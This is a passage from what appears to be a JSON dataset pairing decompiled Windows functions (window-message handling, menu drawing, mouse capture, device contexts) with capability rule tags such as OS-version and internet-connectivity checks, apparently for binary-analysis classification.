            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043e600(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.00441fd4();\n        if (iVar1 != 0) {\n            fcn.0043e5dc();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0043e6bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e6bc(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x38) != 0) {\n        cVar1 = fcn.0043dfd8();\n        if (in_ECX == 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (cVar1 != '\\0') {\n            sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.0043e154(arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 176
    },
    "0043e7d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e7d8(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x43ed0c;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x43e856;\n                    fcn.00414eec();\n                    puStack80 = 0x43e85f;\n                    cVar3 = fcn.0043d8e8();\n                    if (cVar3 != '\\0') goto code_r0x0043ecf6;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x43ea6a;\n                    fcn.00414eec();\n                    puStack80 = 0x43ea77;\n                    iVar5 = fcn.0043d848();\n                    if (iVar5 != 0) {\n                        puStack80 = 0x43ea90;\n                        fcn.00421624();\n                        puStack84 = 0x43eb3f;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(iVar9 + 0x18);\n                        puStack96 = 0x43eaad;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x43eb22;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.00421d14();\n                        fcn.00421b80();\n                        uVar8 = *(iVar9 + 0x10);\n                        puStack112 = 0x43eafa;\n                        fcn.0043efd0(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x43eb29;\n                        uStack104 = 0x43eb11;\n                        fcn.00421d14();\n                        puStack112 = 0x43eb21;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x43eb75;\n                    fcn.00414eec();\n                    puStack80 = 0x43eb82;\n                    piVar4 = fcn.0043d848();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x43eb9b;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x43ec82;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x43ebb8;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.00421624();\n                        uStack100 = 0x43ec5d;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x43ebd2;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x43ec40;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.00421d14();\n                        fcn.00421b80();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x43ec47;\n                        uStack120 = 0x43ec32;\n                        fcn.00421d14();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x43e968;\n                    piVar4 = fcn.00414eec();\n                    puStack80 = 0x43e96d;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x43e97f;\n                        iVar5 = fcn.00414eec();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x43e991;\n                        fcn.00414eec();\n                        puStack80 = 0x43e99e;\n                        *NULL = fcn.0043d848();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x43e9b5;\n                        fcn.00414eec();\n                        puStack80 = 0x43e9c2;\n                        iVar9 = fcn.0043d878();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x43e9d0;\n                            fcn.00414eec();\n                            puStack80 = 0x43e9dd;\n                            fcn.0043d878();\n                        }\n                        if (*(**0x492ce0 + 0x6c) != 0) {\n                            if ((*(*(**0x492ce0 + 0x6c) + 0x270) & 8) == 0) {\n                                puStack80 = 0x43ea36;\n                                fcn.00462c68();\n                            }\n                            else {\n                                puStack80 = 0x43ea23;\n                                fcn.00462cf0();\n                            }\n                        }\n                        goto code_r0x0043ecf6;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x43e88c;\n                fcn.00414eec();\n                puStack80 = 0x43e894;\n                cVar3 = fcn.0043d904();\n                if (cVar3 != '\\0') goto code_r0x0043ecf6;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x43e8d9;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x43e8f8;\n                fcn.00414eec();\n                puStack80 = 0x43e904;\n                iVar10 = fcn.0043d848();\n                if (iVar10 != 0) {\n                    puStack80 = 0x43e91b;\n                    fcn.00442288();\n                    puStack80 = 0x43e92a;\n                    fcn.00463044();\n                    goto code_r0x0043ecf6;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x43e941;\n        fcn.00463044();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x43ecab;\n                piVar4 = fcn.00414eec();\n                puStack80 = 0x43ecb6;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x0043eccc:\n                    puStack80 = 0x43ecd6;\n                    fcn.0043e3b8();\n                    goto code_r0x0043ecf6;\n                }\n                puStack80 = 0x43ecc8;\n                iVar10 = fcn.0043d848();\n                if (iVar10 != 0) goto code_r0x0043eccc;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x43ecf3;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x0043ecf6:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x43ed13;\n    uStack72 = 0x43ed0b;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 2918
    },
    "0043ed1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043ed1c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 8) == 0) {\n        uVar1 = fcn.0041c69c(fcn.0043e78c, in_EAX);\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00414d8c();\n    return;\n}\n",
        "token_count": 101
    },
    "0043efd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043efd0(uint arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x4929cc < 5) && ((**0x4929cc != 4 || (**0x492bbc < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.00404154();\n    cVar2 = fcn.004040e4();\n    if (((arg_8h & 1) == 0) || ((cVar2 != '\\0' && ((cVar2 == '\\0' || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.004214d4();\n            fcn.00420c18();\n        }\n        else {\n            fcn.004214d4();\n            fcn.00420c18();\n        }\n    }\n    else {\n        fcn.004214d4();\n        fcn.00420c18();\n    }\n    (**(*in_EAX + 0x30))(cVar2, arg_8h);\n    return;\n}\n",
        "token_count": 289
    },
    "00442030": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00442030(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00441fd4();\n    if ((iVar1 == 0) && (*0x4964f6 != 0)) {\n        (**0x4964f4)();\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00442320": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00442320(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.00441fd4();\n    if (((iVar1 != 0) && (*0x49169c != 0)) && (iVar1 == *(*0x49169c + 0x30))) {\n        iVar1 = *0x49169c;\n    }\n    return iVar1;\n}\n",
        "token_count": 98
    },
    "00442348": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00442348(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x49169c = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004040e4(),  iVar1 = *0x49169c,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x49169c = iVar1;\n        uVar3 = fcn.0044d1c8();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "00442610": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00442610(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x44270f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044377c();\n        }\n        else if (iVar1 == 0x200) {\n            var_10h._0_2_ = param_2[2];\n            var_ch = var_10h;\n            var_10h._2_2_ = param_2[2] >> 0x10;\n            var_8h = var_10h._2_2_;\n            in_stack_ffffffc4 = *0x496520;\n            puStack44 = &stack0xfffffffc;\n            sub.user32.dll_ClientToScreen(*0x496520, &var_ch);\n            fcn.004430ec();\n        }\n        else if (iVar1 == 0x202) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044377c();\n        }\n        else if (iVar1 == 0x205) {\n            if (*(in_EAX + 0x38) == '\\0') {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044377c();\n            }\n            else {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044377c();\n            }\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.004430ec();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack44 = &stack0xfffffffc;\n            fcn.0044377c();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack44 = &stack0xfffffffc;\n        fcn.004430ec();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    return;\n}\n",
        "token_count": 631
    },
    "0044284c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044284c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.00404154();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 73
    },
    "004428e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004428e8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004427d8();\n    *(in_EAX + 0x38) = 1;\n    uVar1 = fcn.0042132c();\n    *(in_EAX + 0x48) = uVar1;\n    fcn.004285c8();\n    fcn.004214a8();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 226
    },
    "00442ae0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00442ae0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 255
    },
    "00442b4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00442b4c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.00442f94();\n    iVar2 = func_0x0040749c(hWnd, 4);\n    if (iVar2 != *(**0x492b60 + 0x30)) {\n        iVar2 = fcn.00441fd4();\n        if (iVar2 == 0) {\n            return var_1h;\n        }\n        do {\n            iVar2 = *(iVar2 + 0x30);\n        } while (iVar2 != 0);\n        hWnd = fcn.0044d1c8();\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        var_18h = fcn.0044d1c8();\n        if (var_18h != hWnd) {\n            iVar2 = *(*(arg_8h + -0x10) + 0x30);\n            if (iVar2 == 0) {\n                cVar1 = fcn.004040e4();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.0044d1c8();\n                }\n            }\n            else {\n                do {\n                    iVar2 = *(iVar2 + 0x30);\n                } while (iVar2 != 0);\n                var_1ch = fcn.0044d1c8();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.00442ae0, &var_1ch);\n            sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.00404154(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004040e4();\n                if ((((cVar1 == '\\0') || (*(*(*0x496518 + 0x40) + 0x94) == 0)) ||\n                    (iVar2 = fcn.0044d1c8(),  iVar2 != hWnd)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  iVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 752
    },
    "00442ce8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00442ce8(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0044d1c8();\n        uVar2 = fcn.0044d1c8(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 124
    },
    "00442d2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00442d2c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x49653c != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x492b60 + 0xbc)) {\n            (**(**0x496540 + 8))();\n            iVar4 = *(*0x49653c + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.00414eec();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1da) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.0044d1c8();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.00442ce8(&var_1h + 1),  cVar1 == '\\0')) &&\n                           (cVar1 = fcn.00404154(),  cVar1 != '\\0')) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.00404154();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.00442458();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x496540)[2]) {\n                var_18h = fcn.00442510(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.00442b4c(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 678
    },
    "00442e80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442e80(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x49653c == 0) {\n            *0x49653c = fcn.00403f28();\n        }\n        iVar1 = fcn.00414f48();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.00414dd8();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.00414d8c();\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00442edc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00442edc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "00443010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00443010(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x496518 + 8) != 0) {\n        iVar1 = fcn.00442edc(*0x496518 + 0x10, *(*0x496518 + 8));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 100
    },
    "0044304c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044304c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(*0x496518 + 8);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1db) != '\\0')) && (*(iVar1 + 0x1ac) != 0)) &&\n       (iVar2 = fcn.0044bb7c(),  iVar2 != 0)) {\n        iVar2 = fcn.0044bb7c();\n        if ((iVar2 == 1) && (iVar2 = fcn.00414eec(),  iVar2 == *(*0x496518 + 0x40))) {\n            return 0;\n        }\n        iVar2 = fcn.00443aec();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.00414f48();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        var_4h = fcn.0044bb90();\n    }\n    return var_4h;\n}\n",
        "token_count": 295
    },
    "004430ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
